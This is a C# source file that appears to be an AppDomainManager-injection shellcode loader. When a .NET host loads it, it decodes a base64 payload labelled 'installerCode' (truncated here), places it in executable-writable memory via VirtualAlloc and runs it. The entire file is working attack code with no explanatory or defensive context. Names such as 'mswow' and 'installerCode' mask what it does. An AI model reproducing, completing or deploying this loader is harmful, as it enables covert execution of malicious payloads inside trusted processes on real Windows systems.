using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;



public sealed class mswow : AppDomainManager
{
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
        MoveItOnOver.Execute();
    }

}

public static class MoveItOnOver
{

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate bool FunctionPtr();

    public static void Execute()
    {
        var installerCode = Convert.FromBase64String(@"/OiJAA.....");
        var installerCodeAddr = GoingNative.VirtualAlloc((uint)IntPtr.Zero, (uint)installerCode.Length, (uint)StateEnum.MemCommit, (uint)ProtectionEnum.PageExecuteReadwrite);
        Marshal.Copy(installerCode, 0, installerCodeAddr, installerCode.Length);
        var runDelegate = Marshal.GetDelegateForFunctionPointer<FunctionPtr>(installerCodeAddr);
        runDelegate();

    }
}

public static class GoingNative
{
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
}

public enum StateEnum
{
    MemCommit = 0x1000,
    MemReserve = 0x2000,
    MemFree = 0x10000
}

public enum ProtectionEnum
{
    PageReadonly = 0x02,
    PageReadwrite = 0x04,
    PageExecute = 0x10,
    PageExecuteRead = 0x20,
    PageExecuteReadwrite = 0x40
}
